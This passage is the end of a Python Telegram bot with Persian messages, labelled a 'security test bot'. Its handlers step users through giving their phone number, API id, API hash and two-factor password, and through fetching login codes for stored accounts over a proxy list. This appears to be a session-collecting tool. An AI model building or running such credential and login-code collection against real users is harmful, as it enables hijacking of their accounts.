async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    await clear_user_session(user_id)
    
    if str(user_id) in login_sessions:
        del login_sessions[str(user_id)]
    
    await main_menu(update, context, edit=True)

# ============ دستور start ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await main_menu(update, context)

# ============ هندلر پیام‌ها ============
async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if str(user_id) in login_sessions and login_sessions[str(user_id)].get('step') == 'waiting_code':
        await handle_get_account_code(update, context)
        return
    
    if user_id in user_sessions:
        step = user_sessions[user_id].get("step")
        if step == "phone":
            await handle_phone(update, context)
        elif step == "api_id":
            await handle_api_id(update, context)
        elif step == "api_hash":
            await handle_api_hash(update, context)
        elif step == "password":
            await handle_password(update, context)
        return
    
    await update.message.reply_text("❌ لطفاً از دکمه‌های منو استفاده کنید.", parse_mode='HTML')

# ============ اجرا ============
def main():
    try:
        delete_webhook()
        
        print("=" * 60)
        print("🔐 ربات تست امنیت تلگرام")
        print("=" * 60)
        print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
        print(f"🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}")
        print("=" * 60)
        
        application = Application.builder().token(TOKEN).build()
        
        application.add_handler(CallbackQueryHandler(new_session, pattern="^new_session$"))
        application.add_handler(CallbackQueryHandler(get_account, pattern="^get_account$"))
        application.add_handler(CallbackQueryHandler(select_account, pattern="^select_account_"))
        application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))
        
        print("✅ ربات با موفقیت راه‌اندازی شد.")
        print("💡 برای شروع از /start استفاده کنید.")
        print("=" * 60)
        
        application.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        print(f"❌ خطا: {e}")

if __name__ == "__main__":
    main()
